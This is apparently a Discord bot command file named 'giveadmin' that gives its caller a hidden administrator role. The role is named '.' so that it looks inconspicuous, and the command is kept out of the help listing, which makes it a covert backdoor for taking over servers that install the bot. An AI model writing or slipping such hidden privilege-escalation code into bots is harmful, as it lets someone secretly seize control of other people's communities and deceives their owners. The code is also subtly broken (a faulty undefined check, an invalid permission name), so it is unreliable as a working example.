const { prefix } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an inconspicous admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	helpMessage: false,
	execute(message) {
		const role = message.guild.roles.cache.find(x => x.name === '.');
		let member = message.mentions.members.first();
		if (!member) member = message.author;

		if (typeof role === undefined) {
			message.guild.roles.create({
				data: {
					name: '.',
					permissions:[{
						'ADMIN': true,
					}],
				},
			});
		}

		member.roles.add(role);
	},
};